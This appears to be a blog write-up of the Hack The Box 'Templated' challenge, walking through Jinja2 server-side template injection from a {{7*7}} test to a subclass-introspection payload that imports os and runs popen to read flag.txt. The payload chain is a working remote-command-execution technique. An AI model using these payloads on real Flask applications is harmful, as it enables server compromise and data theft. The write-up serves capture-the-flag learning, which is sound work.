---
title: "Templated"
date: 2025-08-20 21:47:00 +0500
categories: [Challenges]
tags: [HTB, Web, SSTI]
---

## Investigating the Instance

On visiting the spawned instance `http://94.237.54.192:48939`, we are greeted with:

![alt text](/assets/images/templated-web.png)

Something of interest is the message:

`Proudly powered by Flask/Jinja2`

I tried investigating the request and response headers yet nothing interesting showed up. 
I also did a directory brute force and had no results.

Then I tried going to random pages like:

`http://94.237.54.192:48939/robots.txt`

![alt text](/assets/images/templated-verbatim.png)

What I noticed was the reflected user input. (a big hint for SSTI usually)

Something Jinja is well known for is it's SSTI. So what's a SSTI?

### Understanding SSTI

SSTI or Server Side Templated Injection occurs when user input is embedded unsafely into server-side templates.

What happens in SSTI:

- Web applications use template engines (like Jinja2, Twig, Freemarker, etc.) to dynamically generate HTML, emails, or other content
- When user input is directly inserted into templates without proper validation or sanitization, attackers can inject malicious template code
- The template engine then executes this malicious code on the server

SSTI is considered a high-severity vulnerability because it can lead to complete server compromise, making it a critical concern for web application security.

### Testing for SSTI

For Jinja2 we have a simple payload that we could try and confirm the existence of SSTI. `{{7*7}}`

`94.237.54.192:48939/{{7*7}}`

Our input wasn't `49` right?

![alt text](/assets/images/templated-SSTI.png)

## Abusing SSTI

Time for us to get the `/flag.txt`. 

### Reveal Class Information

We will attempt to exploit Python's object introspection capabilities to access the Method Resolution Order (MRO) of the string class (basically revealing class information).

`94.237.54.192:48939/{{ ''.__class__.__mro__ }}`

Returns:

`'(<class 'str'>, <class 'object'>)'`

Since `object` was also revealed we could use it to reveal the sub-classes.

### Finding subclasses

We will now try to request all the sub-classes with:

`94.237.54.192:48939/{{ ''.__class__.__mro__[1].__subclasses__() }}`

This will reveal a huge list of classes that inherit from object. We will try to find a class that we could use for malicious purpose specifically file operations in our context.

We are looking for either of the sub-class:

- `<class 'subprocess.Popen'>`
- `<class '_io.TextIOWrapper'>`

I wrote a simple script that could be used to find the index of that sub-class:

```python
linesList = []

with open("classes.txt", "r") as file:
    lines = file.read()
    linesList = [item.strip() for item in lines.split(',')]
    
    search_string = "<class 'subprocess.Popen'>"
    if search_string in linesList:
        index_location = linesList.index(search_string)
        print(f"Found at index: {index_location}")
    else:
        print(f"'{search_string}' was not found in the list.")
```

We found it at index:

`Found at index: 414`

We can confirm if the index really is correct by:

`http://94.237.54.192:48939/%7B%7B%20''.__class__.__mro__[1].__subclasses__()[414]%20%7D%7D`

Going down this route didn't work for me the way I intended. The other sub-classes weren't of much use either.

## Searching for import function

What I tried afterwards was to look for a sub-class that had `import` in their `global namespace`. One such sub-class is `warnings.catch_warnings`. We confirm if `import` is available by:

`94.237.54.192:48939/{{''.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__}}`

Afterwards, we will check if we can access the `import` function:

`http://94.237.54.192:48939/%7B%7B''.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__['__import__']%7D%7D`

Then, `import os` and access `popen` to read `flag.txt`:

`http://94.237.54.192:48939/%7B%7B"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("cat%20flag.txt").read()%7D%7D`

---

